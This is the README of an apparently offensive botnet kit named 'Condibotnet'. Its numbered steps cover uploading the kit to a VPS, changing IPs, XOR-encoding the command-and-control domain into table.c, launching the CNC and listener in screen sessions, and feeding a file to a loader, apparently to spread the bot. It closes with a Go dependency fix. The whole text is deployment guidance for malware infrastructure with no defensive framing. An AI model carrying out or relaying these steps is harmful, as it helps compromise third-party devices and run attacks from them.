# Condibotnet

Installation: 

1) the vps and transfer the archive via sftp to /root

2)  Change all IPs as written in tut.txt 

3)  Copy and paste all commands 

4) Take the domain and run it through ./enc string “domain” You will receive a xored version of  ”domain“, take it and throw it in table.c ("TABLE_CNC_DOMAIN") and change the number 

5) cd cnc/ 

   screen ./cnc 55555 1337 10 

   screen ./listen 

6) cat "file.txt" | ./loader 

7) have a problem connector.go:41:18: undefined: strings. download the old version github.com/go-sql-driver/mysql and unpack it into Project/Proj1/src/etc.